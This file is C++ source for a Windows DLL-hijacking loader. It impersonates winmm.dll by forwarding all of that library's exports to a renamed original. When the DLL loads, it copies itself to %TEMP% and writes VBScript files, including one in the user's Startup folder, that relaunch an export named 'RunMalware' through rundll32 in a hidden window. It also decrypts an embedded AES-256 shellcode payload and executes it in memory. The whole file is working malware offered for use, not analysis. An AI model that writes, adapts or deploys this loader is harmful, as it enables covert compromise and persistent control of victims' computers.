#include "pch.h"
#include <windows.h>
#include <processthreadsapi.h>
#include <shlobj.h>
#include <cstring>
#include <cstdio>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma warning(disable : 4996)

// ============================================================================
// DLL EXPORT FORWARDING TO winmm.dll (to prevent crashes)
// ============================================================================
#pragma comment(linker, "/export:=tmpAF41.,@2")
#pragma comment(linker, "/export:mciExecute=tmpAF41.mciExecute,@3")
#pragma comment(linker, "/export:CloseDriver=tmpAF41.CloseDriver,@4")
#pragma comment(linker, "/export:DefDriverProc=tmpAF41.DefDriverProc,@5")
#pragma comment(linker, "/export:DriverCallback=tmpAF41.DriverCallback,@6")
#pragma comment(linker, "/export:DrvGetModuleHandle=tmpAF41.DrvGetModuleHandle,@7")
#pragma comment(linker, "/export:GetDriverModuleHandle=tmpAF41.GetDriverModuleHandle,@8")
#pragma comment(linker, "/export:OpenDriver=tmpAF41.OpenDriver,@9")
#pragma comment(linker, "/export:PlaySound=tmpAF41.PlaySound,@10")
#pragma comment(linker, "/export:PlaySoundA=tmpAF41.PlaySoundA,@11")
#pragma comment(linker, "/export:PlaySoundW=tmpAF41.PlaySoundW,@12")
#pragma comment(linker, "/export:SendDriverMessage=tmpAF41.SendDriverMessage,@13")
#pragma comment(linker, "/export:WOWAppExit=tmpAF41.WOWAppExit,@14")
#pragma comment(linker, "/export:auxGetDevCapsA=tmpAF41.auxGetDevCapsA,@15")
#pragma comment(linker, "/export:auxGetDevCapsW=tmpAF41.auxGetDevCapsW,@16")
#pragma comment(linker, "/export:auxGetNumDevs=tmpAF41.auxGetNumDevs,@17")
#pragma comment(linker, "/export:auxGetVolume=tmpAF41.auxGetVolume,@18")
#pragma comment(linker, "/export:auxOutMessage=tmpAF41.auxOutMessage,@19")
#pragma comment(linker, "/export:auxSetVolume=tmpAF41.auxSetVolume,@20")
#pragma comment(linker, "/export:joyConfigChanged=tmpAF41.joyConfigChanged,@21")
#pragma comment(linker, "/export:joyGetDevCapsA=tmpAF41.joyGetDevCapsA,@22")
#pragma comment(linker, "/export:joyGetDevCapsW=tmpAF41.joyGetDevCapsW,@23")
#pragma comment(linker, "/export:joyGetNumDevs=tmpAF41.joyGetNumDevs,@24")
#pragma comment(linker, "/export:joyGetPos=tmpAF41.joyGetPos,@25")
#pragma comment(linker, "/export:joyGetPosEx=tmpAF41.joyGetPosEx,@26")
#pragma comment(linker, "/export:joyGetThreshold=tmpAF41.joyGetThreshold,@27")
#pragma comment(linker, "/export:joyReleaseCapture=tmpAF41.joyReleaseCapture,@28")
#pragma comment(linker, "/export:joySetCapture=tmpAF41.joySetCapture,@29")
#pragma comment(linker, "/export:joySetThreshold=tmpAF41.joySetThreshold,@30")
#pragma comment(linker, "/export:mciDriverNotify=tmpAF41.mciDriverNotify,@31")
#pragma comment(linker, "/export:mciDriverYield=tmpAF41.mciDriverYield,@32")
#pragma comment(linker, "/export:mciFreeCommandResource=tmpAF41.mciFreeCommandResource,@33")
#pragma comment(linker, "/export:mciGetCreatorTask=tmpAF41.mciGetCreatorTask,@34")
#pragma comment(linker, "/export:mciGetDeviceIDA=tmpAF41.mciGetDeviceIDA,@35")
#pragma comment(linker, "/export:mciGetDeviceIDFromElementIDA=tmpAF41.mciGetDeviceIDFromElementIDA,@36")
#pragma comment(linker, "/export:mciGetDeviceIDFromElementIDW=tmpAF41.mciGetDeviceIDFromElementIDW,@37")
#pragma comment(linker, "/export:mciGetDeviceIDW=tmpAF41.mciGetDeviceIDW,@38")
#pragma comment(linker, "/export:mciGetDriverData=tmpAF41.mciGetDriverData,@39")
#pragma comment(linker, "/export:mciGetErrorStringA=tmpAF41.mciGetErrorStringA,@40")
#pragma comment(linker, "/export:mciGetErrorStringW=tmpAF41.mciGetErrorStringW,@41")
#pragma comment(linker, "/export:mciGetYieldProc=tmpAF41.mciGetYieldProc,@42")
#pragma comment(linker, "/export:mciLoadCommandResource=tmpAF41.mciLoadCommandResource,@43")
#pragma comment(linker, "/export:mciSendCommandA=tmpAF41.mciSendCommandA,@44")
#pragma comment(linker, "/export:mciSendCommandW=tmpAF41.mciSendCommandW,@45")
#pragma comment(linker, "/export:mciSendStringA=tmpAF41.mciSendStringA,@46")
#pragma comment(linker, "/export:mciSendStringW=tmpAF41.mciSendStringW,@47")
#pragma comment(linker, "/export:mciSetDriverData=tmpAF41.mciSetDriverData,@48")
#pragma comment(linker, "/export:mciSetYieldProc=tmpAF41.mciSetYieldProc,@49")
#pragma comment(linker, "/export:midiConnect=tmpAF41.midiConnect,@50")
#pragma comment(linker, "/export:midiDisconnect=tmpAF41.midiDisconnect,@51")
#pragma comment(linker, "/export:midiInAddBuffer=tmpAF41.midiInAddBuffer,@52")
#pragma comment(linker, "/export:midiInClose=tmpAF41.midiInClose,@53")
#pragma comment(linker, "/export:midiInGetDevCapsA=tmpAF41.midiInGetDevCapsA,@54")
#pragma comment(linker, "/export:midiInGetDevCapsW=tmpAF41.midiInGetDevCapsW,@55")
#pragma comment(linker, "/export:midiInGetErrorTextA=tmpAF41.midiInGetErrorTextA,@56")
#pragma comment(linker, "/export:midiInGetErrorTextW=tmpAF41.midiInGetErrorTextW,@57")
#pragma comment(linker, "/export:midiInGetID=tmpAF41.midiInGetID,@58")
#pragma comment(linker, "/export:midiInGetNumDevs=tmpAF41.midiInGetNumDevs,@59")
#pragma comment(linker, "/export:midiInMessage=tmpAF41.midiInMessage,@60")
#pragma comment(linker, "/export:midiInOpen=tmpAF41.midiInOpen,@61")
#pragma comment(linker, "/export:midiInPrepareHeader=tmpAF41.midiInPrepareHeader,@62")
#pragma comment(linker, "/export:midiInReset=tmpAF41.midiInReset,@63")
#pragma comment(linker, "/export:midiInStart=tmpAF41.midiInStart,@64")
#pragma comment(linker, "/export:midiInStop=tmpAF41.midiInStop,@65")
#pragma comment(linker, "/export:midiInUnprepareHeader=tmpAF41.midiInUnprepareHeader,@66")
#pragma comment(linker, "/export:midiOutCacheDrumPatches=tmpAF41.midiOutCacheDrumPatches,@67")
#pragma comment(linker, "/export:midiOutCachePatches=tmpAF41.midiOutCachePatches,@68")
#pragma comment(linker, "/export:midiOutClose=tmpAF41.midiOutClose,@69")
#pragma comment(linker, "/export:midiOutGetDevCapsA=tmpAF41.midiOutGetDevCapsA,@70")
#pragma comment(linker, "/export:midiOutGetDevCapsW=tmpAF41.midiOutGetDevCapsW,@71")
#pragma comment(linker, "/export:midiOutGetErrorTextA=tmpAF41.midiOutGetErrorTextA,@72")
#pragma comment(linker, "/export:midiOutGetErrorTextW=tmpAF41.midiOutGetErrorTextW,@73")
#pragma comment(linker, "/export:midiOutGetID=tmpAF41.midiOutGetID,@74")
#pragma comment(linker, "/export:midiOutGetNumDevs=tmpAF41.midiOutGetNumDevs,@75")
#pragma comment(linker, "/export:midiOutGetVolume=tmpAF41.midiOutGetVolume,@76")
#pragma comment(linker, "/export:midiOutLongMsg=tmpAF41.midiOutLongMsg,@77")
#pragma comment(linker, "/export:midiOutMessage=tmpAF41.midiOutMessage,@78")
#pragma comment(linker, "/export:midiOutOpen=tmpAF41.midiOutOpen,@79")
#pragma comment(linker, "/export:midiOutPrepareHeader=tmpAF41.midiOutPrepareHeader,@80")
#pragma comment(linker, "/export:midiOutReset=tmpAF41.midiOutReset,@81")
#pragma comment(linker, "/export:midiOutSetVolume=tmpAF41.midiOutSetVolume,@82")
#pragma comment(linker, "/export:midiOutShortMsg=tmpAF41.midiOutShortMsg,@83")
#pragma comment(linker, "/export:midiOutUnprepareHeader=tmpAF41.midiOutUnprepareHeader,@84")
#pragma comment(linker, "/export:midiStreamClose=tmpAF41.midiStreamClose,@85")
#pragma comment(linker, "/export:midiStreamOpen=tmpAF41.midiStreamOpen,@86")
#pragma comment(linker, "/export:midiStreamOut=tmpAF41.midiStreamOut,@87")
#pragma comment(linker, "/export:midiStreamPause=tmpAF41.midiStreamPause,@88")
#pragma comment(linker, "/export:midiStreamPosition=tmpAF41.midiStreamPosition,@89")
#pragma comment(linker, "/export:midiStreamProperty=tmpAF41.midiStreamProperty,@90")
#pragma comment(linker, "/export:midiStreamRestart=tmpAF41.midiStreamRestart,@91")
#pragma comment(linker, "/export:midiStreamStop=tmpAF41.midiStreamStop,@92")
#pragma comment(linker, "/export:mixerClose=tmpAF41.mixerClose,@93")
#pragma comment(linker, "/export:mixerGetControlDetailsA=tmpAF41.mixerGetControlDetailsA,@94")
#pragma comment(linker, "/export:mixerGetControlDetailsW=tmpAF41.mixerGetControlDetailsW,@95")
#pragma comment(linker, "/export:mixerGetDevCapsA=tmpAF41.mixerGetDevCapsA,@96")
#pragma comment(linker, "/export:mixerGetDevCapsW=tmpAF41.mixerGetDevCapsW,@97")
#pragma comment(linker, "/export:mixerGetID=tmpAF41.mixerGetID,@98")
#pragma comment(linker, "/export:mixerGetLineControlsA=tmpAF41.mixerGetLineControlsA,@99")
#pragma comment(linker, "/export:mixerGetLineControlsW=tmpAF41.mixerGetLineControlsW,@100")
#pragma comment(linker, "/export:mixerGetLineInfoA=tmpAF41.mixerGetLineInfoA,@101")
#pragma comment(linker, "/export:mixerGetLineInfoW=tmpAF41.mixerGetLineInfoW,@102")
#pragma comment(linker, "/export:mixerGetNumDevs=tmpAF41.mixerGetNumDevs,@103")
#pragma comment(linker, "/export:mixerMessage=tmpAF41.mixerMessage,@104")
#pragma comment(linker, "/export:mixerOpen=tmpAF41.mixerOpen,@105")
#pragma comment(linker, "/export:mixerSetControlDetails=tmpAF41.mixerSetControlDetails,@106")
#pragma comment(linker, "/export:mmDrvInstall=tmpAF41.mmDrvInstall,@107")
#pragma comment(linker, "/export:mmGetCurrentTask=tmpAF41.mmGetCurrentTask,@108")
#pragma comment(linker, "/export:mmTaskBlock=tmpAF41.mmTaskBlock,@109")
#pragma comment(linker, "/export:mmTaskCreate=tmpAF41.mmTaskCreate,@110")
#pragma comment(linker, "/export:mmTaskSignal=tmpAF41.mmTaskSignal,@111")
#pragma comment(linker, "/export:mmTaskYield=tmpAF41.mmTaskYield,@112")
#pragma comment(linker, "/export:mmioAdvance=tmpAF41.mmioAdvance,@113")
#pragma comment(linker, "/export:mmioAscend=tmpAF41.mmioAscend,@114")
#pragma comment(linker, "/export:mmioClose=tmpAF41.mmioClose,@115")
#pragma comment(linker, "/export:mmioCreateChunk=tmpAF41.mmioCreateChunk,@116")
#pragma comment(linker, "/export:mmioDescend=tmpAF41.mmioDescend,@117")
#pragma comment(linker, "/export:mmioFlush=tmpAF41.mmioFlush,@118")
#pragma comment(linker, "/export:mmioGetInfo=tmpAF41.mmioGetInfo,@119")
#pragma comment(linker, "/export:mmioInstallIOProcA=tmpAF41.mmioInstallIOProcA,@120")
#pragma comment(linker, "/export:mmioInstallIOProcW=tmpAF41.mmioInstallIOProcW,@121")
#pragma comment(linker, "/export:mmioOpenA=tmpAF41.mmioOpenA,@122")
#pragma comment(linker, "/export:mmioOpenW=tmpAF41.mmioOpenW,@123")
#pragma comment(linker, "/export:mmioRead=tmpAF41.mmioRead,@124")
#pragma comment(linker, "/export:mmioRenameA=tmpAF41.mmioRenameA,@125")
#pragma comment(linker, "/export:mmioRenameW=tmpAF41.mmioRenameW,@126")
#pragma comment(linker, "/export:mmioSeek=tmpAF41.mmioSeek,@127")
#pragma comment(linker, "/export:mmioSendMessage=tmpAF41.mmioSendMessage,@128")
#pragma comment(linker, "/export:mmioSetBuffer=tmpAF41.mmioSetBuffer,@129")
#pragma comment(linker, "/export:mmioSetInfo=tmpAF41.mmioSetInfo,@130")
#pragma comment(linker, "/export:mmioStringToFOURCCA=tmpAF41.mmioStringToFOURCCA,@131")
#pragma comment(linker, "/export:mmioStringToFOURCCW=tmpAF41.mmioStringToFOURCCW,@132")
#pragma comment(linker, "/export:mmioWrite=tmpAF41.mmioWrite,@133")
#pragma comment(linker, "/export:mmsystemGetVersion=tmpAF41.mmsystemGetVersion,@134")
#pragma comment(linker, "/export:sndPlaySoundA=tmpAF41.sndPlaySoundA,@135")
#pragma comment(linker, "/export:sndPlaySoundW=tmpAF41.sndPlaySoundW,@136")
#pragma comment(linker, "/export:timeBeginPeriod=tmpAF41.timeBeginPeriod,@137")
#pragma comment(linker, "/export:timeEndPeriod=tmpAF41.timeEndPeriod,@138")
#pragma comment(linker, "/export:timeGetDevCaps=tmpAF41.timeGetDevCaps,@139")
#pragma comment(linker, "/export:timeGetSystemTime=tmpAF41.timeGetSystemTime,@140")
#pragma comment(linker, "/export:timeGetTime=tmpAF41.timeGetTime,@141")
#pragma comment(linker, "/export:timeKillEvent=tmpAF41.timeKillEvent,@142")
#pragma comment(linker, "/export:timeSetEvent=tmpAF41.timeSetEvent,@143")
#pragma comment(linker, "/export:waveInAddBuffer=tmpAF41.waveInAddBuffer,@144")
#pragma comment(linker, "/export:waveInClose=tmpAF41.waveInClose,@145")
#pragma comment(linker, "/export:waveInGetDevCapsA=tmpAF41.waveInGetDevCapsA,@146")
#pragma comment(linker, "/export:waveInGetDevCapsW=tmpAF41.waveInGetDevCapsW,@147")
#pragma comment(linker, "/export:waveInGetErrorTextA=tmpAF41.waveInGetErrorTextA,@148")
#pragma comment(linker, "/export:waveInGetErrorTextW=tmpAF41.waveInGetErrorTextW,@149")
#pragma comment(linker, "/export:waveInGetID=tmpAF41.waveInGetID,@150")
#pragma comment(linker, "/export:waveInGetNumDevs=tmpAF41.waveInGetNumDevs,@151")
#pragma comment(linker, "/export:waveInGetPosition=tmpAF41.waveInGetPosition,@152")
#pragma comment(linker, "/export:waveInMessage=tmpAF41.waveInMessage,@153")
#pragma comment(linker, "/export:waveInOpen=tmpAF41.waveInOpen,@154")
#pragma comment(linker, "/export:waveInPrepareHeader=tmpAF41.waveInPrepareHeader,@155")
#pragma comment(linker, "/export:waveInReset=tmpAF41.waveInReset,@156")
#pragma comment(linker, "/export:waveInStart=tmpAF41.waveInStart,@157")
#pragma comment(linker, "/export:waveInStop=tmpAF41.waveInStop,@158")
#pragma comment(linker, "/export:waveInUnprepareHeader=tmpAF41.waveInUnprepareHeader,@159")
#pragma comment(linker, "/export:waveOutBreakLoop=tmpAF41.waveOutBreakLoop,@160")
#pragma comment(linker, "/export:waveOutClose=tmpAF41.waveOutClose,@161")
#pragma comment(linker, "/export:waveOutGetDevCapsA=tmpAF41.waveOutGetDevCapsA,@162")
#pragma comment(linker, "/export:waveOutGetDevCapsW=tmpAF41.waveOutGetDevCapsW,@163")
#pragma comment(linker, "/export:waveOutGetErrorTextA=tmpAF41.waveOutGetErrorTextA,@164")
#pragma comment(linker, "/export:waveOutGetErrorTextW=tmpAF41.waveOutGetErrorTextW,@165")
#pragma comment(linker, "/export:waveOutGetID=tmpAF41.waveOutGetID,@166")
#pragma comment(linker, "/export:waveOutGetNumDevs=tmpAF41.waveOutGetNumDevs,@167")
#pragma comment(linker, "/export:waveOutGetPitch=tmpAF41.waveOutGetPitch,@168")
#pragma comment(linker, "/export:waveOutGetPlaybackRate=tmpAF41.waveOutGetPlaybackRate,@169")
#pragma comment(linker, "/export:waveOutGetPosition=tmpAF41.waveOutGetPosition,@170")
#pragma comment(linker, "/export:waveOutGetVolume=tmpAF41.waveOutGetVolume,@171")
#pragma comment(linker, "/export:waveOutMessage=tmpAF41.waveOutMessage,@172")
#pragma comment(linker, "/export:waveOutOpen=tmpAF41.waveOutOpen,@173")
#pragma comment(linker, "/export:waveOutPause=tmpAF41.waveOutPause,@174")
#pragma comment(linker, "/export:waveOutPrepareHeader=tmpAF41.waveOutPrepareHeader,@175")
#pragma comment(linker, "/export:waveOutReset=tmpAF41.waveOutReset,@176")
#pragma comment(linker, "/export:waveOutRestart=tmpAF41.waveOutRestart,@177")
#pragma comment(linker, "/export:waveOutSetPitch=tmpAF41.waveOutSetPitch,@178")
#pragma comment(linker, "/export:waveOutSetPlaybackRate=tmpAF41.waveOutSetPlaybackRate,@179")
#pragma comment(linker, "/export:waveOutSetVolume=tmpAF41.waveOutSetVolume,@180")
#pragma comment(linker, "/export:waveOutUnprepareHeader=tmpAF41.waveOutUnprepareHeader,@181")
#pragma comment(linker, "/export:waveOutWrite=tmpAF41.waveOutWrite,@182")
#pragma comment(linker, "/export:DllRegisterServer=ProxyDllRegisterServer")

// ============================================================================
// EXECUTION FLOW & EXPECTED BEHAVIOR
// ============================================================================
// 1. DLL_PROCESS_ATTACH: DllMain creates DoMagic worker thread and waits for completion
// 2. DoMagic decrypts AES-256 shellcode from CIPHERTEXT/IV
// 3. Execute shellcode locally after setting memory protection
// 4. Cleanup: secure-zero decrypted buffer, release crypto context
// ============================================================================
// NOTE: All exports are defined in winmm.def, not in pragma comments
extern "C" LONG NTAPI NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

#include "payload_hex.c"

static volatile LONG g_DoMagicState = 0;
static HANDLE g_hDoMagicDoneEvent = NULL;

DWORD WINAPI DoMagic(LPVOID lpParameter, HMODULE hDllModule);
void SetResilientPersistence(HMODULE hModule);

static DWORD WINAPI DoMagicWorker(LPVOID lpParam)
{
	HMODULE hDllModule = (HMODULE)lpParam;

	__try {
		OutputDebugStringA("DoMagicWorker: Calling DoMagic");
		DoMagic(NULL, hDllModule);
		OutputDebugStringA("DoMagicWorker: DoMagic returned");
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		OutputDebugStringA("DoMagicWorker: Exception in DoMagic");
	}

	InterlockedExchange(&g_DoMagicState, 2);
	if (g_hDoMagicDoneEvent) SetEvent(g_hDoMagicDoneEvent);
	return 0;
}

static BOOL StartDoMagicAsync(HMODULE hDllModule)
{
	LONG currentState = InterlockedCompareExchange(&g_DoMagicState, 1, 0);
	if (currentState == 1) {
		return TRUE;
	}

	if (currentState == 2) {
		if (g_hDoMagicDoneEvent) {
			ResetEvent(g_hDoMagicDoneEvent);
		}

		if (InterlockedCompareExchange(&g_DoMagicState, 1, 2) != 2) {
			return TRUE;
		}
	}

	if (!g_hDoMagicDoneEvent) {
		g_hDoMagicDoneEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
	}

	HANDLE hThread = CreateThread(NULL, 0, DoMagicWorker, (LPVOID)hDllModule, 0, NULL);
	if (!hThread) {
		InterlockedExchange(&g_DoMagicState, 0);
		return FALSE;
	}

	CloseHandle(hThread);
	return TRUE;
}

extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer(void)
{
	OutputDebugStringA("\n=== DllRegisterServer CALLED ===");

	// Get the DLL module handle using GetModuleHandleEx with GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
	// This will get the handle of the module containing THIS FUNCTION (DllRegisterServer)
	// This works REGARDLESS of what the DLL is named (Dll1.dll, winmm.dll, etc.)
	HMODULE hDll = NULL;
	BOOL bGetModule = GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
		(LPCSTR)&DllRegisterServer,
		&hDll);

	// DEBUG: Log which method succeeded
	char debugMsg[512];
	if (bGetModule && hDll) {
		sprintf_s(debugMsg, "GetModuleHandleEx succeeded: hDll=%p", hDll);
		OutputDebugStringA(debugMsg);

		// Verify we got the right module
		char modulePath[MAX_PATH] = { 0 };
		GetModuleFileNameA(hDll, modulePath, MAX_PATH);
		sprintf_s(debugMsg, "Module path from GetModuleHandleEx: %s", modulePath);
		OutputDebugStringA(debugMsg);
	}
	else {
		OutputDebugStringA("WARNING: GetModuleHandleEx failed or returned NULL");
		// Fallback: use host process (regsvr32.exe when called via regsvr32)
		hDll = GetModuleHandleA(NULL);

		char modulePath[MAX_PATH] = { 0 };
		GetModuleFileNameA(hDll, modulePath, MAX_PATH);
		sprintf_s(debugMsg, "Fallback to NULL, module path: %s", modulePath);
		OutputDebugStringA(debugMsg);
	}

	sprintf_s(debugMsg, "Calling SetResilientPersistence with hDll: %p", hDll);
	OutputDebugStringA(debugMsg);

	// Call SetResilientPersistence directly
	SetResilientPersistence(hDll);

	OutputDebugStringA("=== DllRegisterServer RETURNING S_OK ===\n");
	return S_OK;
}

extern "C" __declspec(dllexport) void __stdcall RunMalware(HWND hwnd, HINSTANCE hInstance, LPSTR lpCmdLine, int nCmdShow)
{
	OutputDebugStringA("\n=== RunMalware CALLED ===");

	HMODULE hDll = GetModuleHandleA("winmm.dll");
	if (!hDll) {
		hDll = hInstance;
	}

	StartDoMagicAsync(hDll);

	if (g_hDoMagicDoneEvent) {
		WaitForSingleObject(g_hDoMagicDoneEvent, INFINITE);
	}

	OutputDebugStringA("=== RunMalware DONE ===");
}

void SetResilientPersistence(HMODULE hModule) {
	char dllPath[MAX_PATH] = { 0 };
	char tempPath[MAX_PATH] = { 0 };

	// 1. Lấy đường dẫn của CHÍNH FILE DLL đang chạy
	DWORD dwLen = GetModuleFileNameA(hModule, dllPath, MAX_PATH);
	if (dwLen == 0) {
		return;
	}

	// 2. Lấy thư mục %TEMP%
	dwLen = GetTempPathA(MAX_PATH, tempPath);
	if (dwLen == 0) {
		return;
	}

	// Ensure trailing backslash
	size_t tempLen = strlen(tempPath);
	if (tempLen > 0 && tempPath[tempLen - 1] != '\\') {
		strcat_s(tempPath, MAX_PATH, "\\");
	}

	char backupDll[MAX_PATH] = { 0 };
	char vbsPath[MAX_PATH] = { 0 };

	sprintf_s(backupDll, sizeof(backupDll), "%sSysUpdateCore.dll", tempPath);
	sprintf_s(vbsPath, sizeof(vbsPath), "%sSysCheck.vbs", tempPath);

	// 3. Copy DLL vào Temp
	CopyFileA(dllPath, backupDll, FALSE);

	// 4. Tạo file VBScript
	FILE* vbsFile = NULL;
	errno_t err = fopen_s(&vbsFile, vbsPath, "w");
	if (err == 0 && vbsFile != NULL) {
		fprintf(vbsFile, "Set ws = CreateObject(\"WScript.Shell\")\n");
		fprintf(vbsFile, "ws.Run \"rundll32.exe \"\"\" & \"%s\" & \"\"\",RunMalware\", 0, False\n", backupDll);
		fclose(vbsFile);
	}

	// 5. Create Task Scheduler entry using WMI (no admin needed for some operations)
	// Alternative: Write to user's startup folder (more reliable without admin)

	// 5. Ghi thẳng file VBS vào thư mục Startup (Loại bỏ hoàn toàn file .bat)
	char startupPath[MAX_PATH] = { 0 };
	HRESULT hr = SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);

	if (SUCCEEDED(hr)) {
		char vbsInStartup[MAX_PATH] = { 0 };
		sprintf_s(vbsInStartup, sizeof(vbsInStartup), "%s\\SystemUpdate.vbs", startupPath);

		// Tạo trực tiếp file VBS trong thư mục Startup
		FILE* startupVbsFile = NULL;
		errno_t errStartup = fopen_s(&startupVbsFile, vbsInStartup, "w");

		if (errStartup == 0 && startupVbsFile != NULL) {
			// Sử dụng WScript.Sleep thay cho lệnh timeout của batch (5000 mili-giây = 5 giây)
			// Lệnh Sleep này chạy ngầm trong bộ nhớ, không sinh ra giao diện
			fprintf(startupVbsFile, "WScript.Sleep 5000\n");
			fprintf(startupVbsFile, "Set ws = CreateObject(\"WScript.Shell\")\n");

			// Gọi rundll32 chạy file DLL trong thư mục Temp ở chế độ Ẩn (0)
			fprintf(startupVbsFile, "ws.Run \"rundll32.exe \"\"\" & \"%s\" & \"\"\",RunMalware\", 0, False\n", backupDll);
			fclose(startupVbsFile);
		}
	}

	OutputDebugStringA("=== SetResilientPersistence END ===\n");
}

DWORD WINAPI DoMagic(LPVOID lpParameter, HMODULE hDllModule)
{
	OutputDebugStringA("=== DoMagic START ===");

	char msg[256];
	sprintf_s(msg, "hDllModule: %p", hDllModule);
	OutputDebugStringA(msg);

	// AES-256 Key (32 bytes)
	const unsigned char KEY[32] = {
		0x64, 0x61, 0x79, 0x6c, 0x61, 0x6b, 0x65, 0x79, 0x63, 0x75, 0x61, 0x64, 0x6f, 0x61, 0x6e, 0x6e,
		0x74, 0x32, 0x30, 0x35, 0x68, 0x65, 0x68, 0x65, 0x68, 0x65, 0x68, 0x65, 0x68, 0x65, 0x68, 0x65
	};

	HCRYPTPROV hProv = NULL;
	HCRYPTKEY hKey = NULL;
	DWORD dwDataLen = sizeof(CIPHERTEXT);
	DWORD dwDecrypted = dwDataLen;

	// Allocate memory for decrypted shellcode (same size as encrypted)
	unsigned char* decrypted = (unsigned char*)VirtualAlloc(NULL, dwDataLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (decrypted == NULL) {
		return 0;
	}

	// Copy encrypted data to decrypted buffer
	memcpy(decrypted, CIPHERTEXT, dwDataLen);

	__try {
		// Acquire crypto context

		if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, 0)) {
			if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
				__leave;
			}
		}

		// Create key blob structure for AES-256
		struct {
			BLOBHEADER header;
			DWORD cbKeySize;
			BYTE rgbKeyData[32];
		} keyBlob;

		keyBlob.header.bType = PLAINTEXTKEYBLOB;
		keyBlob.header.bVersion = CUR_BLOB_VERSION;
		keyBlob.header.reserved = 0;
		keyBlob.header.aiKeyAlg = CALG_AES_256;
		keyBlob.cbKeySize = 32;
		memcpy(keyBlob.rgbKeyData, KEY, 32);

		// Import the key
		if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
			__leave;
		}

		// Set cipher mode to CBC
		DWORD dwCipherMode = CRYPT_MODE_CBC;
		if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwCipherMode, 0)) {
			CryptDestroyKey(hKey);
			__leave;
		}

		// Set IV
		if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0)) {
			CryptDestroyKey(hKey);
			__leave;
		}

		// Decrypt
		if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted, &dwDecrypted)) {
			CryptDestroyKey(hKey);
			__leave;
		}

		// Clear the key from memory
		CryptDestroyKey(hKey);
		hKey = NULL;

		DWORD oldProtect = 0;
		PVOID pBaseAddr = decrypted;
		SIZE_T szRegion = dwDecrypted;
		BOOL bExecutable = FALSE;

		LONG protectStatus = NtProtectVirtualMemory(
			(HANDLE)-1,
			&pBaseAddr,
			&szRegion,
			PAGE_EXECUTE_READ,
			(PULONG)&oldProtect
		);

		if (protectStatus == 0) {
			bExecutable = TRUE;
		}
		else {
			if (VirtualProtect(decrypted, dwDecrypted, PAGE_EXECUTE_READ, &oldProtect)) {
				bExecutable = TRUE;
			}
		}

		if (bExecutable) {
			FlushInstructionCache(GetCurrentProcess(), decrypted, dwDecrypted);

			__try {
				((void(*)(void))decrypted)();
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				OutputDebugStringA("Shellcode execution raised exception");
			}
		}

		// Set resilient persistence after shellcode execution - pass actual DLL module handle
		OutputDebugStringA("Calling SetResilientPersistence...");
		SetResilientPersistence(hDllModule);
		OutputDebugStringA("SetResilientPersistence completed");

	}
	__finally {
		// Cleanup in finally block - only happens once due to __leave usage
		if (hKey) {
			CryptDestroyKey(hKey);
			hKey = NULL;
		}
		if (hProv) {
			CryptReleaseContext(hProv, 0);
			hProv = NULL;
		}
		if (decrypted) {
			// Secure wipe before freeing
			SecureZeroMemory(decrypted, dwDataLen);
			VirtualFree(decrypted, 0, MEM_RELEASE);
			decrypted = NULL;
		}

		if (g_hDoMagicDoneEvent) {
			SetEvent(g_hDoMagicDoneEvent);
		}

		InterlockedExchange(&g_DoMagicState, 2);
	}

	return 0;
}

// ============================================================================
// PROXY FUNCTION FOR DLL EXPORTS
// ============================================================================
// This function serves as a proxy for DllRegisterServer
// When exported via pragma comment(linker), it gets called instead of the real DllRegisterServer
extern "C" HRESULT __stdcall ProxyDllRegisterServer(void)
{
	return DllRegisterServer();
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		OutputDebugStringA("\n========== DLL_PROCESS_ATTACH ==========");
		char msg[256];
		sprintf_s(msg, "hModule: %p", hModule);
		OutputDebugStringA(msg);

		// Reduce loader-lock work (avoid thread notifications)
		DisableThreadLibraryCalls(hModule);
		OutputDebugStringA("DisableThreadLibraryCalls called");

		// ★ CALL PERSISTENCE IMMEDIATELY when DLL loads
		// This ensures artifacts are created even without regsvr32
		OutputDebugStringA("Calling SetResilientPersistence from DllMain...");
		SetResilientPersistence(hModule);
		OutputDebugStringA("SetResilientPersistence completed");

		// Run DoMagic asynchronously and return immediately to avoid loader deadlocks
		OutputDebugStringA("Calling StartDoMagicAsync...");
		StartDoMagicAsync(hModule);
		OutputDebugStringA("StartDoMagicAsync returned");

		// Minimal delay to allow worker thread to start
		OutputDebugStringA("Sleeping 100ms...");
		Sleep(100);
		OutputDebugStringA("Sleep done");

		break;
	}
	case DLL_THREAD_ATTACH:
		OutputDebugStringA("DLL_THREAD_ATTACH");
		break;
	case DLL_THREAD_DETACH:
		OutputDebugStringA("DLL_THREAD_DETACH");
		break;
	case DLL_PROCESS_DETACH:
		OutputDebugStringA("DLL_PROCESS_DETACH");
		if (g_hDoMagicDoneEvent) {
			CloseHandle(g_hDoMagicDoneEvent);
			g_hDoMagicDoneEvent = NULL;
		}
		break;
	}
	return TRUE;
}

